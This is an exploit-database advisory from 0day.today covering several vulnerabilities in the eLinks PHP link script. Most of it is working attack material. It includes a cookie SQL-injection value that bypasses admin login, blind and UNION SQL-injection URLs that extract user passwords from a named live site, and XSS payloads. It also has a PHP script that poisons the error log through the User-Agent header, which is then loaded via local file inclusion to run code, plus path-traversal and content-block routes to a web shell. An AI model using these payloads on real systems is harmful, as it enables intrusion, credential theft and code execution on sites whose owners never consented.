@@ -1,0 +1,321 @@
+id: 10213
+date: 12/13/2009
+title: eLinks [blind Sql injection / Xss / LFI] Vulnerabilities
+author: 0day Today Team
+cves: 
+
+========================================================
+eLinks [blind Sql injection / Xss / LFI] Vulnerabilities
+========================================================
+
+
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0                          
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      0
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-1
+
+#[+] Discovered By   : Inj3ct0r
+#[+] Site            : Inj3ct0r.com
+#[+] support e-mail  : submit[at]inj3ct0r.com
+
+
+eLinks suffers from remote blind SQL injection, cross site scripting, and local file inclusion vulnerabilities. 
+	
+# 1 [Bypass Authentication]
+
+
+	
+Necessary condition: magic_quotes_gpc = Off
+
+The first thing I decided to check the admin login panel (http:// [elinks] / asm_admin.php) to filter the fields. 
+But unfortunately, all the POST-data filtering built setGPC.
+
+[core/asm_config.php]
+
+PHP code:
+
+ function setGPC (&$array) 
+{ // begin function: setGPC 
+    foreach ($array as $key => $value) { 
+        if (true == is_array($value)) { 
+            setGPC($array[$key]); 
+        } else { 
+            $array[$key] = addslashes($value); 
+        } 
+    } 
+    reset($array); 
+} // end function: setGPC 
+--------------------------- 
+if (!get_magic_quotes_gpc()) { 
+    setGPC($_POST); 
+    reset($_POST); 
+} 
+
+
+As we have seen, only POST-filtered data, which can not but rejoice. 
+Then I began to explore the algorithm authentication (user authentication).
+
+[core/asm_function.php]
+
+
+PHP code:
+
+function auth () 
+{ 
+    global $api;  
+    $session = @$_COOKIE['acore']; 
+    if ($session != '' && $session != '-1') 
+    { 
+        if (true == isset($_SESSION['user']['groups'])) { return true; } 
+
+        $rs = $api->DB->query("SELECT * FROM asm_s_members WHERE session = '".$session."' LIMIT 1"); 
+         
+        if ($rs->count() == 1) 
+        { 
+            $_SESSION['user'] = $rs->row(); 
+            $api->DB->query("UPDATE asm_s_members SET atime = '".time()."' WHERE session = '".$session."' LIMIT 1"); 
+            return true; 
+        } 
+    } 
+    setAuth(0); 
+     
+} 
+
+
+Authentication is carried out by COOKIE-variable acore.
+Defined by the variable value:
+
+word' OR member_id = '1
+
+Receives a request:
+
+SELECT * FROM asm_s_members WHERE session = 'word' OR member_id = '1' LIMIT 1
+
+	
+As the session with the name of 'word' can not exist, there is sample data administrator (member_id = 1).
+Refreshes your page and appear in the admin panel.
+As a result, even without knowing the username, we can login as any user.
+
+
+	
+# 2 Blind sql inj3ct0r in search of:
+
+	
+Necessary condition: magic_quotes_gpc = Off
+
+http://www.***.com/eLinks-search.php?action=search&word=asian'+or+1=1+and+substring(version(),1,1)=5--+1
+
+Shell :
+
+In the admin go to template editor, to edit the templates do not have enough rights, but it can create the files:
+In sortsah in the form of changing the hidden field with the name of the file to:
+
+<input type = "hidden" name = "template_name" value ="../../../../../ home / tgp /***/ links/1.php ">
+
+Getting shell.
+
+# XSS :
+
+/v2/searcherror.php?errormsg=<script>alert(/asd/);</script>
+
+eLinks-search.php?action=result&word=%3Cscript%3Ealert('xss');%3C/script%3E&user_key=1601668980&page=1&pages=-0
+
+# Sql inj3ct0r :
+
+...modules/content/pub.content.php?url=/celebs/view&view=[sql inj]
+
+	
+sample:
+
+http://yobt.com/modules/content/pub.content.php?url=/celebs/view&view=-1'+union+select+1,2,3,4,5,6,7,8,9,10,11,12,concat(user_login,3x0a,user_pass),14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29+from+asm_s_members+limit+0,1/*
+
+# Elinks LFI :
+
+	
+1. Login in asm_admin.php with any username and password;
+	
+2. get the message about wrong password, but, nevertheless, $ _SESSION [ 'user'] [ 'member_id']) becomes equal to 0
+
+3../core/asm_config.php :
+
+PHP code:
+
+if ( strpos($_SERVER['HTTP_USER_AGENT'], 'vdebug') ) { set_error_handler('error_handler'); } 
+function error_handler ($errno, $errmsg, $filename, $linenum, $vars) 
+{ // BEGIN function 
+    if ($errno == 2048 || error_reporting() == 0) { return true; } 
+     
+    $error_file = $_SERVER['DOCUMENT_ROOT'].'/files/logs/error.xml'; 
+    $_request_url = (true == isset($_SERVER['REQUEST_URI'])) ? 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] : 'http://'.$_SERVER['HTTP_HOST'].'/'; 
+    $_http_referer = (true == isset($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : ''; 
+    $_remote_addr = (true == isset($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : ''; 
+    $_http_user_agent = (true == isset($_SERVER['HTTP_USER_AGENT'])) ? $_SERVER['HTTP_USER_AGENT'] : ''; 
+    $error_content = ' 
+    <error date="'.date("Y-m-d H:i:s").'"> 
+        <request_url>'.$_request_url.'</request_url> 
+        <http_referer>'.$_http_referer.'</http_referer> 
+        <remote_addr>'.$_remote_addr.'</remote_addr> 
+        <http_user_agent>'.$_http_user_agent.'</http_user_agent> 
+        <error_number>'.$errno.'</error_number> 
+        <error_message>'.$errmsg.'</error_message> 
+        <file_name>'.$filename.'</file_name> 
+        <line_number>'.$linenum.'</line_number> 
+    </error> 
+</xml>'; 
+    $fp = @fopen($error_file, 'r+'); 
+    if ($fp) { 
+        $cursor_position = filesize($error_file)-7; 
+        fseek($fp, $cursor_position); 
+        fwrite($fp, $error_content); 
+        fclose($fp); 
+    } else { 
+        $fp = fopen($error_file, 'w'); 
+        if ($fp) { 
+            fwrite($fp, "<xml>\n".$error_content); 
+            fclose($fp); 
+        } 
+    } 
+
+	
+4. under this code a http packet with the help of a script:
+
+PHP code:
+
+<? 
+
+set_time_limit (0); 
+$site='yobt.com'; 
+$path='/asm_admin.php?update=1';  
+
+    $fp = fsockopen($site, 80, $errno, $errstr, 30);     
+
+        $out = "GET $path HTTP/1.1\r\n"; 
+        $out .= "Host: $site\r\n"; 
+       $out .= "Content-type: application/x-www-form-urlencoded\r\n"; 
+          $out .= "Connection: Close\r\n"; 
+        $out .= "User-Agent: Opera vdebug <?php phpinfo() ?>\r\n"; //Ñ‚ÑƒÑ‚ Ð½Ð°Ñˆ ÐºÐ¾Ð´ Ð´Ð»Ñ Ð¸Ð½ÐºÐ»ÑƒÐ´Ð° 
+        $out .= "Referer: http://laa.com\r\n"; 
+
+        $out .= "Cookie: 1=2;\r\n\r\n"; 
+
+     fwrite($fp, $out); 
+
+    while (!feof($fp))  
+{ 
+print fread($fp, 4800); 
+} 
+print $out; 
+
+
+?>
+
+	
+instead asm_admin.php? update = 1 any other file that generates the error pohape (for this site come http://yobt.com/asm.pornstars.search.php);
+
+	
+5. my phpinfo, as prescribed in the code, added to. / files / logs / error.xml;
+
+6. in. / asm_clean.php passes authentication :
+
+PHP code:
+
+ if (isset($_SESSION['user']['member_id']) != '1' && SERVER_IP != $_SERVER['REMOTE_ADDR']) { 
+    die('Access denied'); 
+} 
+
+
+(so as login prior to the admin and the variable $ _SESSION [ 'user'] [ 'member_id'] exists);
+
+7. go below code and see
+
+PHP code:
+
+ if (false == isset($_GET['asm'])) { die('Map command not found'); } 
+$file = base64_decode($_GET['asm']); 
+... 
+include(PATH.$file); 
+
+	
+8. only include our error.xml =)
+http://yobt.com/asm_clean.php?asm=L2ZpbGVzL2xvZ3MvZXJyb3IueG1s link to see the withdrawal of phpinfo (unless, of course, authorized, as I wrote above)
+
+
+
+--------------------------------------------------------------------------
+
+Elinks arbitrary code execution
+(for this site is not suitable, because admins removed from the distribution default file. / core / asm_xml_content.php, but still)
+
+1. ./core/asm_xml_content.php
+
+PHP code:
+
+<?php 
+error_reporting(7); 
+$page = (true == isset($_GET['page'])) ? $_GET['page'] : 'index'; 
+$page = $_SERVER['DOCUMENT_ROOT'].'/files/tpl/'.$page.'.xml'; 
+
+if (true == file_exists($page)) { 
+    $filemtime = filemtime($page); 
+    $filemtime = ($filemtime > 10000) ? $filemtime : time()+3600; 
+    $fp = fopen($page, 'r'); 
+    $content = fread($fp, filesize($page)); 
+    fclose($fp); 
+    $content = "?>".$content."<?php "; 
+    ob_start(); 
+    eval ($content);
+
+
+	
+2. Add in. / Files / error.xml our pohape manner described above;
+3. Out of our code through http://elinks/core/asm_xml_content.php?page=../logs/error
+
+-----------------------------------------
+
+Local include :
+
+core/xmlrpc.php
+
+PHP code:
+
+$xmlrpc_server = trim( $_GET['xmlrpc_server'] ); 
+$uri = parse_url( $_SERVER['REQUEST_URI'] ); 
+if ( $uri['query'] ) 
+{ 
+    parse_str( $uri['query'], $_GET ); 
+} 
+if ( true == is_file( PATH."/modules/".$xmlrpc_server."/xmlrpc_server.php" ) ) 
+{ 
+    include_once( PATH."/modules/".$xmlrpc_server."/xmlrpc_server.php" );
+
+
+As we can see the data from $ _GET [ 'xmlrpc_server'], without any filtering into include
+
+Example:
+<div class = "smallfont" style = "m
+
+
+Get shell :
+
+Get shell can also be via the Content Manager-> Content Blocks
+Adding a new block:
+
+Name: whatever
+Alias: s.php
+Content: <? Php phpinfo ();?>
+Status: inactive
+
+Get Shell: /files/blocks/.s.php
+
+
+
+
+#  0day.today [2023-03-27]  #
